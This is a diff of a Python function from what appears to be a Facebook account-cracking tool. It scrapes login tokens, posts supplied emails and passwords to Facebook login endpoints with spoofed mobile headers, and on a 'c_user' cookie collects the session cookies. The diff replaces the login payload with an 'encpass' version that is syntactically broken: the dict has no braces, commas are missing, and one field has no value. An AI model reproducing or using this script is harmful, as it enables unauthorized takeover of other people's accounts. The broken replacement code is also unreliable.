@@ -1180,30 +1180,31 @@ def m5(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    link = session.get(f'https://m.facebook.com').text
-   log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 'pass':ps, 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
-   header_freefb ={'Host': 'm.facebook.com',
-   'Connection': 'keep-alive',
-   'Content-Length': str(len(data)),
-   'Cache-Control': 'max-age=0',
-   'dpr': '2.8375000953674316',
-   'viewport-width': '980',
-   'sec-ch-ua': 'Chromium;v=118, Android',
-   'sec-ch-ua-mobile': '?1',
-   'sec-ch-ua-platform': 'Android',
-   'sec-ch-prefers-color-scheme': 'light',
-   'Upgrade-Insecure-Requests': '1',
-   'Origin': 'https://m.facebook.com',
-   'Content-Type': 'application/x-www-form-urlencoded',
-   'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; 23076PC4BI Build/UKQ1.230917.001)',
-   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-   'X-Requested-With': 'com.facebook.katana',
-   'Sec-Fetch-Site': 'same-origin',
-   'Sec-Fetch-Mode': 'navigate',
-   'Sec-Fetch-User': '?1',
-   'Sec-Fetch-Dest': 'document',
-   'Referer': 'https://m.facebook.com/login/?locale=en_GB',
-   'Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   log_data = 'jazoest': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+   'lsd': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+   'email': idf
+   'cred_type': '100'
+   'login_source': 'device_based_login_add_account'
+   'persistent': 
+   'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps),}
+   header_freefb ={
+            'authority': 'm.facebook.com',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://m.facebook.com',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
